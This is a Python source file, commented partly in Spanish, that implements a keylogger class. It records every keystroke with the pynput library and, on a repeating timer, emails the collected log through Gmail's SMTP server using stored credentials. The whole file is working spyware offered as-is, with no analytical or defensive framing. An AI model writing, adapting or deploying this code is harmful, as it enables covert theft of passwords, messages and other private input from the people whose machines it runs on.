import smtplib

import threading

from pynput import keyboard

# Create Keylogger Class

class KeyLogger:

    # Definir variables __init__

    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger has started..."
        self.email = email
        self.password = password

    # Crear registro al que se agregarán todas las pulsaciones de teclas

    def append_to_log(self, string):
        self.log = self.log + string

    # Create Keylogger

    def on_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.esc:
                print("Exiting program...")
                return False
            else:
                current_key = " " + str(key) + " "

        self.append_to_log(current_key)


    # Crea una estructura trasera subyacente que publicará correos electrónicos.

    def send_mail(self, email, password, message):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    # Crear informe y enviar correo electrónico

    def report_n_send(self):
        send_off = self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report_n_send)
        timer.start()

    # Inicie KeyLogger y envíe correos electrónicos

    def start(self):
        keyboard_listener = keyboard.Listener(on_press = self.on_press)
        with keyboard_listener:
            self.report_n_send()
            keyboard_listener.join()